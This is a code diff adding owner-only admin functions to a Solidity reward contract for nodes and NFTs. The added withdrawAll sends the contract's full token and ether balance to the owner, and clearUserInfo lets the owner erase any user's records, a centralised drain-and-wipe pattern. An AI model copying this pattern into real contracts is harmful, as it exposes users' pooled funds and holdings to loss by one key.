@@ -123,6 +123,44 @@ contract RewardManagement is Ownable{
         _nftContract = FireNFT(addr);
     }
 
+    function clearUserInfo(address addr) public onlyOwner {
+        totalNodeCount -= _nodesOfUser[addr].length;
+        delete _nodesOfUser[addr];
+        delete _nftOfUser[addr];
+    }
+    
+    function importNodeInfo(ImportNodeInfo[] memory nodeInfos) public onlyOwner{
+        uint256 i;
+        for(i=0; i<nodeInfos.length; i++) {
+            _nodesOfUser[nodeInfos[i].buyer].push(
+                NodeInfo({ createTime: nodeInfos[i].createTime, lastTime:nodeInfos[i].createTime + ONE_MONTH_TIME * 3})
+            );
+            totalNodeCount++;
+        }
+        require(i==nodeInfos.length, "not complete transaction");
+    }
+
+    function importNftInfo(ImportNftInfo[] memory nftInfos) public onlyOwner {
+        uint256 i;
+        for(i=0; i<nftInfos.length; i++) {
+            _nftOfUser[nftInfos[i].addr].push(
+                NFTInfo({ createTime: nftInfos[i].createTime, typeOfNFT: NFT_TYPE(nftInfos[i].typeOfNFT)})
+            );
+        }
+        require(i==nftInfos.length, "not complete transaction");
+    }
+
+    function withdrawAll() public onlyOwner{
+        uint256 balance = _tokenContract.balanceOf(address(this));
+        if(balance > 0) {
+            _tokenContract.transfer(msg.sender, balance);
+        }
+        
+        address payable mine = payable(msg.sender);
+        if(address(this).balance > 0) {
+            mine.transfer(address(this).balance);
+        }
+    }
 
     function setNodePrice(uint256 _newNodePrice) public onlyOwner () {
         NODE_PRICE = _newNodePrice;
